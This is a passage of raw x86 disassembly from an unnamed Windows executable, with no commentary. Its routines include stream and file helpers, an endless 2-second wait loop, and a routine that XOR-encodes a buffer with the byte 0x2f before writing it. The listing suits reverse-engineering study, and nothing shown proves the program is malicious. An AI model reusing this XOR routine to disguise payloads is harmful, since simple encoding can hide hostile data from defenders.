  403587:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  40358a:	8b ce                	mov    %esi,%ecx
  40358c:	50                   	push   %eax
  40358d:	ff 15 90 90 40 00    	call   *0x409090
  403593:	8b 78 08             	mov    0x8(%eax),%edi
  403596:	03 38                	add    (%eax),%edi
  403598:	33 c0                	xor    %eax,%eax
  40359a:	85 ff                	test   %edi,%edi
  40359c:	7e 7c                	jle    0x40361a
  40359e:	83 ff 40             	cmp    $0x40,%edi
  4035a1:	72 6d                	jb     0x403610
  4035a3:	8b cf                	mov    %edi,%ecx
  4035a5:	81 e1 3f 00 00 80    	and    $0x8000003f,%ecx
  4035ab:	79 05                	jns    0x4035b2
  4035ad:	49                   	dec    %ecx
  4035ae:	83 c9 c0             	or     $0xffffffc0,%ecx
  4035b1:	41                   	inc    %ecx
  4035b2:	0f 28 15 10 96 40 00 	movaps 0x409610,%xmm2
  4035b9:	8b d7                	mov    %edi,%edx
  4035bb:	2b d1                	sub    %ecx,%edx
  4035bd:	0f 1f 00             	nopl   (%eax)
  4035c0:	0f 10 44 05 e0       	movups -0x20(%ebp,%eax,1),%xmm0
  4035c5:	0f 28 ca             	movaps %xmm2,%xmm1
  4035c8:	66 0f ef c8          	pxor   %xmm0,%xmm1
  4035cc:	0f 11 4c 05 e0       	movups %xmm1,-0x20(%ebp,%eax,1)
  4035d1:	0f 10 44 05 f0       	movups -0x10(%ebp,%eax,1),%xmm0
  4035d6:	0f 28 ca             	movaps %xmm2,%xmm1
  4035d9:	66 0f ef c2          	pxor   %xmm2,%xmm0
  4035dd:	0f 11 44 05 f0       	movups %xmm0,-0x10(%ebp,%eax,1)
  4035e2:	0f 10 44 05 00       	movups 0x0(%ebp,%eax,1),%xmm0
  4035e7:	66 0f ef c2          	pxor   %xmm2,%xmm0
  4035eb:	0f 11 44 05 00       	movups %xmm0,0x0(%ebp,%eax,1)
  4035f0:	0f 10 44 05 10       	movups 0x10(%ebp,%eax,1),%xmm0
  4035f5:	66 0f ef c8          	pxor   %xmm0,%xmm1
  4035f9:	0f 11 4c 05 10       	movups %xmm1,0x10(%ebp,%eax,1)
  4035fe:	83 c0 40             	add    $0x40,%eax
  403601:	3b c2                	cmp    %edx,%eax
  403603:	7c bb                	jl     0x4035c0
  403605:	3b c7                	cmp    %edi,%eax
  403607:	7d 11                	jge    0x40361a
  403609:	0f 1f 80 00 00 00 00 	nopl   0x0(%eax)
  403610:	80 74 05 e0 2f       	xorb   $0x2f,-0x20(%ebp,%eax,1)
  403615:	40                   	inc    %eax
  403616:	3b c7                	cmp    %edi,%eax
  403618:	7c f6                	jl     0x403610
  40361a:	6a 00                	push   $0x0
  40361c:	6a 00                	push   $0x0
  40361e:	6a 00                	push   $0x0
  403620:	8d 4e 10             	lea    0x10(%esi),%ecx
  403623:	ff 15 84 90 40 00    	call   *0x409084
  403629:	8b c7                	mov    %edi,%eax
  40362b:	8d 4e 10             	lea    0x10(%esi),%ecx
  40362e:	99                   	cltd
  40362f:	52                   	push   %edx
  403630:	50                   	push   %eax
  403631:	8d 45 e0             	lea    -0x20(%ebp),%eax
  403634:	50                   	push   %eax
  403635:	ff 15 80 90 40 00    	call   *0x409080
  40363b:	8b 7d bc             	mov    -0x44(%ebp),%edi
  40363e:	83 7f 64 00          	cmpl   $0x0,0x64(%edi)
  403642:	74 25                	je     0x403669
  403644:	8d 4f 18             	lea    0x18(%edi),%ecx
  403647:	e8 84 0f 00 00       	call   0x4045d0
  40364c:	ff 77 64             	push   0x64(%edi)
  40364f:	33 d2                	xor    %edx,%edx
  403651:	8d 4f 18             	lea    0x18(%edi),%ecx
  403654:	84 c0                	test   %al,%al
  403656:	0f 44 ca             	cmove  %edx,%ecx
  403659:	89 4d c4             	mov    %ecx,-0x3c(%ebp)
  40365c:	ff 15 00 92 40 00    	call   *0x409200
  403662:	83 c4 04             	add    $0x4,%esp
  403665:	85 c0                	test   %eax,%eax
  403667:	74 07                	je     0x403670
  403669:	c7 45 c4 00 00 00 00 	movl   $0x0,-0x3c(%ebp)
  403670:	8d 4f 18             	lea    0x18(%edi),%ecx
  403673:	c6 47 60 00          	movb   $0x0,0x60(%edi)
  403677:	c6 47 55 00          	movb   $0x0,0x55(%edi)
  40367b:	ff 15 b8 90 40 00    	call   *0x4090b8
  403681:	83 7d c4 00          	cmpl   $0x0,-0x3c(%ebp)
  403685:	a1 90 c7 40 00       	mov    0x40c790,%eax
  40368a:	8b 0d 94 c7 40 00    	mov    0x40c794,%ecx
  403690:	c7 47 64 00 00 00 00 	movl   $0x0,0x64(%edi)
  403697:	89 47 58             	mov    %eax,0x58(%edi)
  40369a:	89 4f 5c             	mov    %ecx,0x5c(%edi)
  40369d:	c7 47 50 00 00 00 00 	movl   $0x0,0x50(%edi)
  4036a4:	75 11                	jne    0x4036b7
  4036a6:	8b 07                	mov    (%edi),%eax
  4036a8:	6a 00                	push   $0x0
  4036aa:	6a 02                	push   $0x2
  4036ac:	8b 48 04             	mov    0x4(%eax),%ecx
  4036af:	03 cf                	add    %edi,%ecx
  4036b1:	ff 15 ac 90 40 00    	call   *0x4090ac
  4036b7:	8b 7d c0             	mov    -0x40(%ebp),%edi
  4036ba:	47                   	inc    %edi
  4036bb:	89 7d c0             	mov    %edi,-0x40(%ebp)
  4036be:	eb 03                	jmp    0x4036c3
  4036c0:	8b 7d c0             	mov    -0x40(%ebp),%edi
  4036c3:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  4036c6:	e8 75 fa ff ff       	call   0x403140
  4036cb:	8b 75 d0             	mov    -0x30(%ebp),%esi
  4036ce:	85 f6                	test   %esi,%esi
  4036d0:	0f 85 ad fc ff ff    	jne    0x403383
  4036d6:	8b 75 d4             	mov    -0x2c(%ebp),%esi
  4036d9:	85 f6                	test   %esi,%esi
  4036db:	74 21                	je     0x4036fe
  4036dd:	83 c8 ff             	or     $0xffffffff,%eax
  4036e0:	f0 0f c1 46 04       	lock xadd %eax,0x4(%esi)
  4036e5:	75 17                	jne    0x4036fe
  4036e7:	8b 06                	mov    (%esi),%eax
  4036e9:	8b ce                	mov    %esi,%ecx
  4036eb:	ff 10                	call   *(%eax)
  4036ed:	83 c8 ff             	or     $0xffffffff,%eax
  4036f0:	f0 0f c1 46 08       	lock xadd %eax,0x8(%esi)
  4036f5:	75 07                	jne    0x4036fe
  4036f7:	8b 16                	mov    (%esi),%edx
  4036f9:	8b ce                	mov    %esi,%ecx
  4036fb:	ff 52 04             	call   *0x4(%edx)
  4036fe:	8b c7                	mov    %edi,%eax
  403700:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  403703:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  40370a:	59                   	pop    %ecx
  40370b:	5f                   	pop    %edi
  40370c:	5e                   	pop    %esi
  40370d:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  403710:	33 cd                	xor    %ebp,%ecx
  403712:	e8 62 33 00 00       	call   0x406a79
  403717:	8b e5                	mov    %ebp,%esp
  403719:	5d                   	pop    %ebp
  40371a:	c3                   	ret
  40371b:	ff 15 80 91 40 00    	call   *0x409180
  403721:	56                   	push   %esi
  403722:	8b d0                	mov    %eax,%edx
  403724:	b9 1c 94 40 00       	mov    $0x40941c,%ecx
  403729:	e8 02 f3 ff ff       	call   0x402a30
  40372e:	cc                   	int3
  40372f:	cc                   	int3
  403730:	55                   	push   %ebp
  403731:	8b ec                	mov    %esp,%ebp
  403733:	6a ff                	push   $0xffffffff
  403735:	68 9d 7d 40 00       	push   $0x407d9d
  40373a:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  403740:	50                   	push   %eax
  403741:	83 ec 20             	sub    $0x20,%esp
  403744:	56                   	push   %esi
  403745:	a1 04 c0 40 00       	mov    0x40c004,%eax
  40374a:	33 c5                	xor    %ebp,%eax
  40374c:	50                   	push   %eax
  40374d:	8d 45 f4             	lea    -0xc(%ebp),%eax
  403750:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  403756:	8b 0d 00 91 40 00    	mov    0x409100,%ecx
  40375c:	ba 88 94 40 00       	mov    $0x409488,%edx
  403761:	e8 4a 15 00 00       	call   0x404cb0
  403766:	8b 0d 00 91 40 00    	mov    0x409100,%ecx
  40376c:	ba 98 94 40 00       	mov    $0x409498,%edx
  403771:	e8 3a 15 00 00       	call   0x404cb0
  403776:	c6 45 f0 00          	movb   $0x0,-0x10(%ebp)
  40377a:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  40377d:	ff 75 f0             	push   -0x10(%ebp)
  403780:	e8 7b 2b 00 00       	call   0x406300
  403785:	83 c4 04             	add    $0x4,%esp
  403788:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  40378b:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  403792:	e8 59 fb ff ff       	call   0x4032f0
  403797:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  40379e:	8b f0                	mov    %eax,%esi
  4037a0:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  4037a3:	83 f9 08             	cmp    $0x8,%ecx
  4037a6:	72 34                	jb     0x4037dc
  4037a8:	8b 55 d4             	mov    -0x2c(%ebp),%edx
  4037ab:	8d 0c 4d 02 00 00 00 	lea    0x2(,%ecx,2),%ecx
  4037b2:	8b c2                	mov    %edx,%eax
  4037b4:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  4037ba:	72 16                	jb     0x4037d2
  4037bc:	8b 50 fc             	mov    -0x4(%eax),%edx
  4037bf:	83 c1 23             	add    $0x23,%ecx
  4037c2:	2b c2                	sub    %edx,%eax
  4037c4:	83 c0 fc             	add    $0xfffffffc,%eax
  4037c7:	83 f8 1f             	cmp    $0x1f,%eax
  4037ca:	76 06                	jbe    0x4037d2
  4037cc:	ff 15 80 91 40 00    	call   *0x409180
  4037d2:	51                   	push   %ecx
  4037d3:	52                   	push   %edx
  4037d4:	e8 e3 32 00 00       	call   0x406abc
  4037d9:	83 c4 08             	add    $0x8,%esp
  4037dc:	8b 0d 00 91 40 00    	mov    0x409100,%ecx
  4037e2:	ba e0 94 40 00       	mov    $0x4094e0,%edx
  4037e7:	e8 c4 14 00 00       	call   0x404cb0
  4037ec:	56                   	push   %esi
  4037ed:	8b c8                	mov    %eax,%ecx
  4037ef:	ff 15 7c 90 40 00    	call   *0x40907c
  4037f5:	ba 74 94 40 00       	mov    $0x409474,%edx
  4037fa:	8b c8                	mov    %eax,%ecx
  4037fc:	e8 af 14 00 00       	call   0x404cb0
  403801:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  403804:	c7 45 ec d0 07 00 00 	movl   $0x7d0,-0x14(%ebp)
  40380b:	c7 45 f0 00 00 00 00 	movl   $0x0,-0x10(%ebp)
  403812:	e8 b9 16 00 00       	call   0x404ed0
  403817:	eb e8                	jmp    0x403801
  403819:	cc                   	int3
  40381a:	cc                   	int3
  40381b:	cc                   	int3
  40381c:	cc                   	int3
  40381d:	cc                   	int3
  40381e:	cc                   	int3
  40381f:	cc                   	int3
  403820:	55                   	push   %ebp
  403821:	8b ec                	mov    %esp,%ebp
  403823:	56                   	push   %esi
  403824:	8b f1                	mov    %ecx,%esi
  403826:	8b 4d 08             	mov    0x8(%ebp),%ecx
  403829:	57                   	push   %edi
  40382a:	e8 d1 18 00 00       	call   0x405100
  40382f:	8b f8                	mov    %eax,%edi
  403831:	8b cf                	mov    %edi,%ecx
  403833:	ff 15 94 90 40 00    	call   *0x409094
  403839:	84 c0                	test   %al,%al
  40383b:	74 0d                	je     0x40384a
  40383d:	5f                   	pop    %edi
  40383e:	c7 46 38 00 00 00 00 	movl   $0x0,0x38(%esi)
  403845:	5e                   	pop    %esi
  403846:	5d                   	pop    %ebp
  403847:	c2 04 00             	ret    $0x4
  40384a:	8b ce                	mov    %esi,%ecx
  40384c:	89 7e 38             	mov    %edi,0x38(%esi)
  40384f:	ff 15 b8 90 40 00    	call   *0x4090b8
  403855:	5f                   	pop    %edi
  403856:	5e                   	pop    %esi
  403857:	5d                   	pop    %ebp
  403858:	c2 04 00             	ret    $0x4
  40385b:	cc                   	int3
  40385c:	cc                   	int3
  40385d:	cc                   	int3
  40385e:	cc                   	int3
  40385f:	cc                   	int3
  403860:	56                   	push   %esi
  403861:	8b f1                	mov    %ecx,%esi
  403863:	83 7e 4c 00          	cmpl   $0x0,0x4c(%esi)
  403867:	74 24                	je     0x40388d
  403869:	8b 06                	mov    (%esi),%eax
  40386b:	6a ff                	push   $0xffffffff
  40386d:	ff 50 0c             	call   *0xc(%eax)
  403870:	83 f8 ff             	cmp    $0xffffffff,%eax
  403873:	74 18                	je     0x40388d
  403875:	ff 76 4c             	push   0x4c(%esi)
  403878:	ff 15 04 92 40 00    	call   *0x409204
  40387e:	33 c9                	xor    %ecx,%ecx
  403880:	83 c4 04             	add    $0x4,%esp
  403883:	85 c0                	test   %eax,%eax
  403885:	0f 99 c1             	setns  %cl
  403888:	5e                   	pop    %esi
  403889:	8d 41 ff             	lea    -0x1(%ecx),%eax
  40388c:	c3                   	ret
  40388d:	33 c0                	xor    %eax,%eax
  40388f:	5e                   	pop    %esi
  403890:	c3                   	ret
  403891:	cc                   	int3
  403892:	cc                   	int3
  403893:	cc                   	int3
  403894:	cc                   	int3
  403895:	cc                   	int3
  403896:	cc                   	int3
  403897:	cc                   	int3
  403898:	cc                   	int3
  403899:	cc                   	int3
  40389a:	cc                   	int3
  40389b:	cc                   	int3
  40389c:	cc                   	int3
  40389d:	cc                   	int3
  40389e:	cc                   	int3
  40389f:	cc                   	int3
  4038a0:	55                   	push   %ebp
  4038a1:	8b ec                	mov    %esp,%ebp
  4038a3:	83 ec 10             	sub    $0x10,%esp
  4038a6:	a1 04 c0 40 00       	mov    0x40c004,%eax
  4038ab:	33 c5                	xor    %ebp,%eax
  4038ad:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4038b0:	8b 55 08             	mov    0x8(%ebp),%edx
  4038b3:	56                   	push   %esi
  4038b4:	8b f1                	mov    %ecx,%esi
  4038b6:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  4038b9:	57                   	push   %edi
  4038ba:	85 d2                	test   %edx,%edx
  4038bc:	75 0e                	jne    0x4038cc
  4038be:	8b c1                	mov    %ecx,%eax
  4038c0:	0b 45 10             	or     0x10(%ebp),%eax
  4038c3:	75 07                	jne    0x4038cc
  4038c5:	b8 04 00 00 00       	mov    $0x4,%eax
  4038ca:	eb 02                	jmp    0x4038ce
  4038cc:	33 c0                	xor    %eax,%eax
  4038ce:	8b 7e 4c             	mov    0x4c(%esi),%edi
  4038d1:	85 ff                	test   %edi,%edi
  4038d3:	0f 84 a1 00 00 00    	je     0x40397a
  4038d9:	51                   	push   %ecx
  4038da:	50                   	push   %eax
  4038db:	52                   	push   %edx
  4038dc:	57                   	push   %edi
  4038dd:	ff 15 08 92 40 00    	call   *0x409208
  4038e3:	83 c4 10             	add    $0x10,%esp
  4038e6:	85 c0                	test   %eax,%eax
  4038e8:	0f 85 8c 00 00 00    	jne    0x40397a
  4038ee:	8b 7e 4c             	mov    0x4c(%esi),%edi
  4038f1:	8b ce                	mov    %esi,%ecx
  4038f3:	c6 46 48 01          	movb   $0x1,0x48(%esi)
  4038f7:	88 46 3d             	mov    %al,0x3d(%esi)
  4038fa:	ff 15 b8 90 40 00    	call   *0x4090b8
  403900:	85 ff                	test   %edi,%edi
  403902:	74 46                	je     0x40394a
  403904:	8d 45 f0             	lea    -0x10(%ebp),%eax
  403907:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%ebp)
  40390e:	50                   	push   %eax
  40390f:	8d 45 f4             	lea    -0xc(%ebp),%eax
  403912:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%ebp)
  403919:	50                   	push   %eax
  40391a:	8d 45 f8             	lea    -0x8(%ebp),%eax
  40391d:	c7 45 f0 00 00 00 00 	movl   $0x0,-0x10(%ebp)
  403924:	50                   	push   %eax
  403925:	57                   	push   %edi
  403926:	ff 15 d8 91 40 00    	call   *0x4091d8
  40392c:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40392f:	83 c4 10             	add    $0x10,%esp
  403932:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  403935:	89 46 0c             	mov    %eax,0xc(%esi)
  403938:	89 46 10             	mov    %eax,0x10(%esi)
  40393b:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40393e:	89 46 1c             	mov    %eax,0x1c(%esi)
  403941:	89 46 20             	mov    %eax,0x20(%esi)
  403944:	89 4e 2c             	mov    %ecx,0x2c(%esi)
  403947:	89 4e 30             	mov    %ecx,0x30(%esi)
  40394a:	8b 0d 90 c7 40 00    	mov    0x40c790,%ecx
  403950:	8b c6                	mov    %esi,%eax
  403952:	8b 15 94 c7 40 00    	mov    0x40c794,%edx
  403958:	89 7e 4c             	mov    %edi,0x4c(%esi)
  40395b:	5f                   	pop    %edi
  40395c:	89 4e 40             	mov    %ecx,0x40(%esi)
  40395f:	89 56 44             	mov    %edx,0x44(%esi)
  403962:	c7 46 38 00 00 00 00 	movl   $0x0,0x38(%esi)
  403969:	5e                   	pop    %esi
  40396a:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40396d:	33 cd                	xor    %ebp,%ecx
  40396f:	e8 05 31 00 00       	call   0x406a79
  403974:	8b e5                	mov    %ebp,%esp
  403976:	5d                   	pop    %ebp
  403977:	c2 0c 00             	ret    $0xc
  40397a:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40397d:	33 c0                	xor    %eax,%eax
  40397f:	5f                   	pop    %edi
  403980:	33 cd                	xor    %ebp,%ecx
  403982:	5e                   	pop    %esi
  403983:	e8 f1 30 00 00       	call   0x406a79
  403988:	8b e5                	mov    %ebp,%esp
  40398a:	5d                   	pop    %ebp
  40398b:	c2 0c 00             	ret    $0xc
  40398e:	cc                   	int3
  40398f:	cc                   	int3
  403990:	55                   	push   %ebp
  403991:	8b ec                	mov    %esp,%ebp
  403993:	83 e4 f8             	and    $0xfffffff8,%esp
  403996:	83 ec 14             	sub    $0x14,%esp
  403999:	a1 04 c0 40 00       	mov    0x40c004,%eax
  40399e:	33 c4                	xor    %esp,%eax
  4039a0:	89 44 24 10          	mov    %eax,0x10(%esp)
  4039a4:	8b 55 0c             	mov    0xc(%ebp),%edx
  4039a7:	03 55 14             	add    0x14(%ebp),%edx
  4039aa:	8b 45 10             	mov    0x10(%ebp),%eax
  4039ad:	13 45 18             	adc    0x18(%ebp),%eax
  4039b0:	53                   	push   %ebx
  4039b1:	8b 5d 08             	mov    0x8(%ebp),%ebx
  4039b4:	56                   	push   %esi
  4039b5:	57                   	push   %edi
  4039b6:	8b f9                	mov    %ecx,%edi
  4039b8:	89 54 24 10          	mov    %edx,0x10(%esp)
  4039bc:	89 44 24 14          	mov    %eax,0x14(%esp)
  4039c0:	83 7f 4c 00          	cmpl   $0x0,0x4c(%edi)
  4039c4:	74 71                	je     0x403a37
  4039c6:	e8 05 0c 00 00       	call   0x4045d0
  4039cb:	84 c0                	test   %al,%al
  4039cd:	74 68                	je     0x403a37
  4039cf:	8d 44 24 10          	lea    0x10(%esp),%eax
  4039d3:	50                   	push   %eax
  4039d4:	ff 77 4c             	push   0x4c(%edi)
  4039d7:	ff 15 ec 91 40 00    	call   *0x4091ec
  4039dd:	83 c4 08             	add    $0x8,%esp
  4039e0:	85 c0                	test   %eax,%eax
  4039e2:	75 53                	jne    0x403a37
  4039e4:	8b 45 1c             	mov    0x1c(%ebp),%eax
  4039e7:	8b 77 0c             	mov    0xc(%edi),%esi
  4039ea:	8b 4d 20             	mov    0x20(%ebp),%ecx
  4039ed:	89 47 40             	mov    %eax,0x40(%edi)
  4039f0:	8d 47 3c             	lea    0x3c(%edi),%eax
  4039f3:	89 4f 44             	mov    %ecx,0x44(%edi)
  4039f6:	39 06                	cmp    %eax,(%esi)
  4039f8:	75 14                	jne    0x403a0e
  4039fa:	8b 57 54             	mov    0x54(%edi),%edx
  4039fd:	8b 4f 50             	mov    0x50(%edi),%ecx
  403a00:	2b d1                	sub    %ecx,%edx
  403a02:	89 0e                	mov    %ecx,(%esi)
  403a04:	8b 47 1c             	mov    0x1c(%edi),%eax
  403a07:	89 08                	mov    %ecx,(%eax)
  403a09:	8b 47 2c             	mov    0x2c(%edi),%eax
  403a0c:	89 10                	mov    %edx,(%eax)
  403a0e:	8b 77 40             	mov    0x40(%edi),%esi
  403a11:	8b 7f 44             	mov    0x44(%edi),%edi
  403a14:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  403a18:	8b 54 24 14          	mov    0x14(%esp),%edx
  403a1c:	89 0b                	mov    %ecx,(%ebx)
  403a1e:	89 53 04             	mov    %edx,0x4(%ebx)
  403a21:	c7 43 08 00 00 00 00 	movl   $0x0,0x8(%ebx)
  403a28:	c7 43 0c 00 00 00 00 	movl   $0x0,0xc(%ebx)
  403a2f:	89 73 10             	mov    %esi,0x10(%ebx)
  403a32:	89 7b 14             	mov    %edi,0x14(%ebx)
  403a35:	eb 23                	jmp    0x403a5a
  403a37:	0f 57 c0             	xorps  %xmm0,%xmm0
  403a3a:	c7 03 ff ff ff ff    	movl   $0xffffffff,(%ebx)
  403a40:	c7 43 04 ff ff ff ff 	movl   $0xffffffff,0x4(%ebx)
  403a47:	c7 43 08 00 00 00 00 	movl   $0x0,0x8(%ebx)
  403a4e:	c7 43 0c 00 00 00 00 	movl   $0x0,0xc(%ebx)
  403a55:	66 0f d6 43 10       	movq   %xmm0,0x10(%ebx)
  403a5a:	8b 4c 24 1c          	mov    0x1c(%esp),%ecx
  403a5e:	8b c3                	mov    %ebx,%eax
  403a60:	5f                   	pop    %edi
  403a61:	5e                   	pop    %esi
  403a62:	5b                   	pop    %ebx
  403a63:	33 cc                	xor    %esp,%ecx
  403a65:	e8 0f 30 00 00       	call   0x406a79
  403a6a:	8b e5                	mov    %ebp,%esp
  403a6c:	5d                   	pop    %ebp
  403a6d:	c2 20 00             	ret    $0x20
  403a70:	55                   	push   %ebp
  403a71:	8b ec                	mov    %esp,%ebp
  403a73:	83 e4 f8             	and    $0xfffffff8,%esp
  403a76:	83 ec 14             	sub    $0x14,%esp
  403a79:	a1 04 c0 40 00       	mov    0x40c004,%eax
  403a7e:	33 c4                	xor    %esp,%eax
  403a80:	89 44 24 10          	mov    %eax,0x10(%esp)
  403a84:	53                   	push   %ebx
  403a85:	8b 5d 08             	mov    0x8(%ebp),%ebx
  403a88:	56                   	push   %esi
  403a89:	57                   	push   %edi
  403a8a:	8b f9                	mov    %ecx,%edi
  403a8c:	8b 47 1c             	mov    0x1c(%edi),%eax
  403a8f:	8d 4f 3c             	lea    0x3c(%edi),%ecx
  403a92:	39 08                	cmp    %ecx,(%eax)
  403a94:	75 1a                	jne    0x403ab0
  403a96:	83 7d 14 01          	cmpl   $0x1,0x14(%ebp)
  403a9a:	75 14                	jne    0x403ab0
  403a9c:	83 7f 38 00          	cmpl   $0x0,0x38(%edi)
  403aa0:	75 0e                	jne    0x403ab0
  403aa2:	8b 75 0c             	mov    0xc(%ebp),%esi
  403aa5:	8b 45 10             	mov    0x10(%ebp),%eax
  403aa8:	83 c6 ff             	add    $0xffffffff,%esi
  403aab:	83 d0 ff             	adc    $0xffffffff,%eax
  403aae:	eb 06                	jmp    0x403ab6
  403ab0:	8b 45 10             	mov    0x10(%ebp),%eax
  403ab3:	8b 75 0c             	mov    0xc(%ebp),%esi
  403ab6:	83 7f 4c 00          	cmpl   $0x0,0x4c(%edi)
  403aba:	89 44 24 0c          	mov    %eax,0xc(%esp)
  403abe:	0f 84 90 00 00 00    	je     0x403b54
  403ac4:	8b cf                	mov    %edi,%ecx
  403ac6:	e8 05 0b 00 00       	call   0x4045d0
  403acb:	84 c0                	test   %al,%al
  403acd:	0f 84 81 00 00 00    	je     0x403b54
  403ad3:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  403ad7:	8b c6                	mov    %esi,%eax
  403ad9:	0b c1                	or     %ecx,%eax
  403adb:	8b 45 14             	mov    0x14(%ebp),%eax
  403ade:	75 05                	jne    0x403ae5
  403ae0:	83 f8 01             	cmp    $0x1,%eax
  403ae3:	74 13                	je     0x403af8
  403ae5:	50                   	push   %eax
  403ae6:	51                   	push   %ecx
  403ae7:	56                   	push   %esi
  403ae8:	ff 77 4c             	push   0x4c(%edi)
  403aeb:	ff 15 e4 91 40 00    	call   *0x4091e4
  403af1:	83 c4 10             	add    $0x10,%esp
  403af4:	85 c0                	test   %eax,%eax
  403af6:	75 5c                	jne    0x403b54
  403af8:	8d 44 24 10          	lea    0x10(%esp),%eax
  403afc:	50                   	push   %eax
  403afd:	ff 77 4c             	push   0x4c(%edi)
  403b00:	ff 15 f4 91 40 00    	call   *0x4091f4
  403b06:	83 c4 08             	add    $0x8,%esp
  403b09:	85 c0                	test   %eax,%eax
  403b0b:	75 47                	jne    0x403b54
  403b0d:	8b 47 0c             	mov    0xc(%edi),%eax
  403b10:	8d 4f 3c             	lea    0x3c(%edi),%ecx
  403b13:	39 08                	cmp    %ecx,(%eax)
  403b15:	75 14                	jne    0x403b2b
  403b17:	8b 57 54             	mov    0x54(%edi),%edx
  403b1a:	8b 4f 50             	mov    0x50(%edi),%ecx
  403b1d:	2b d1                	sub    %ecx,%edx
  403b1f:	89 08                	mov    %ecx,(%eax)
  403b21:	8b 47 1c             	mov    0x1c(%edi),%eax
  403b24:	89 08                	mov    %ecx,(%eax)
  403b26:	8b 47 2c             	mov    0x2c(%edi),%eax
  403b29:	89 10                	mov    %edx,(%eax)
  403b2b:	8b 77 40             	mov    0x40(%edi),%esi
  403b2e:	8b 7f 44             	mov    0x44(%edi),%edi
  403b31:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  403b35:	8b 54 24 14          	mov    0x14(%esp),%edx
  403b39:	89 0b                	mov    %ecx,(%ebx)
  403b3b:	89 53 04             	mov    %edx,0x4(%ebx)
  403b3e:	c7 43 08 00 00 00 00 	movl   $0x0,0x8(%ebx)
  403b45:	c7 43 0c 00 00 00 00 	movl   $0x0,0xc(%ebx)
  403b4c:	89 73 10             	mov    %esi,0x10(%ebx)
  403b4f:	89 7b 14             	mov    %edi,0x14(%ebx)
  403b52:	eb 23                	jmp    0x403b77
  403b54:	0f 57 c0             	xorps  %xmm0,%xmm0
  403b57:	c7 03 ff ff ff ff    	movl   $0xffffffff,(%ebx)
  403b5d:	c7 43 04 ff ff ff ff 	movl   $0xffffffff,0x4(%ebx)
  403b64:	c7 43 08 00 00 00 00 	movl   $0x0,0x8(%ebx)
  403b6b:	c7 43 0c 00 00 00 00 	movl   $0x0,0xc(%ebx)
  403b72:	66 0f d6 43 10       	movq   %xmm0,0x10(%ebx)
  403b77:	8b 4c 24 1c          	mov    0x1c(%esp),%ecx
  403b7b:	8b c3                	mov    %ebx,%eax
  403b7d:	5f                   	pop    %edi
  403b7e:	5e                   	pop    %esi
  403b7f:	5b                   	pop    %ebx
  403b80:	33 cc                	xor    %esp,%ecx
  403b82:	e8 f2 2e 00 00       	call   0x406a79
  403b87:	8b e5                	mov    %ebp,%esp
  403b89:	5d                   	pop    %ebp
  403b8a:	c2 14 00             	ret    $0x14
  403b8d:	cc                   	int3
  403b8e:	cc                   	int3
  403b8f:	cc                   	int3
  403b90:	55                   	push   %ebp
  403b91:	8b ec                	mov    %esp,%ebp
  403b93:	83 e4 f8             	and    $0xfffffff8,%esp
  403b96:	83 ec 1c             	sub    $0x1c,%esp
  403b99:	53                   	push   %ebx
  403b9a:	8b d9                	mov    %ecx,%ebx
  403b9c:	56                   	push   %esi
  403b9d:	57                   	push   %edi
  403b9e:	83 7b 38 00          	cmpl   $0x0,0x38(%ebx)
  403ba2:	74 18                	je     0x403bbc
  403ba4:	ff 75 10             	push   0x10(%ebp)
  403ba7:	ff 75 0c             	push   0xc(%ebp)
  403baa:	ff 75 08             	push   0x8(%ebp)
  403bad:	ff 15 74 90 40 00    	call   *0x409074
  403bb3:	5f                   	pop    %edi
  403bb4:	5e                   	pop    %esi
  403bb5:	5b                   	pop    %ebx
  403bb6:	8b e5                	mov    %ebp,%esp
  403bb8:	5d                   	pop    %ebp
  403bb9:	c2 0c 00             	ret    $0xc
  403bbc:	8b 43 20             	mov    0x20(%ebx),%eax
  403bbf:	8b 75 0c             	mov    0xc(%ebp),%esi
  403bc2:	8b 7d 10             	mov    0x10(%ebp),%edi
  403bc5:	89 74 24 20          	mov    %esi,0x20(%esp)
  403bc9:	8b 08                	mov    (%eax),%ecx
  403bcb:	8d 43 30             	lea    0x30(%ebx),%eax
  403bce:	89 7c 24 24          	mov    %edi,0x24(%esp)
  403bd2:	89 4c 24 1c          	mov    %ecx,0x1c(%esp)
  403bd6:	89 44 24 18          	mov    %eax,0x18(%esp)
  403bda:	85 c9                	test   %ecx,%ecx
  403bdc:	74 06                	je     0x403be4
  403bde:	8b 00                	mov    (%eax),%eax
  403be0:	8b 08                	mov    (%eax),%ecx
  403be2:	eb 06                	jmp    0x403bea
  403be4:	33 c9                	xor    %ecx,%ecx
  403be6:	89 44 24 18          	mov    %eax,0x18(%esp)
  403bea:	8b c1                	mov    %ecx,%eax
  403bec:	99                   	cltd
  403bed:	89 44 24 10          	mov    %eax,0x10(%esp)
  403bf1:	8b ca                	mov    %edx,%ecx
  403bf3:	89 4c 24 14          	mov    %ecx,0x14(%esp)
  403bf7:	85 ff                	test   %edi,%edi
  403bf9:	7c 57                	jl     0x403c52
  403bfb:	7f 04                	jg     0x403c01
  403bfd:	85 f6                	test   %esi,%esi
  403bff:	74 51                	je     0x403c52
  403c01:	85 c9                	test   %ecx,%ecx
  403c03:	7c 48                	jl     0x403c4d
  403c05:	7f 04                	jg     0x403c0b
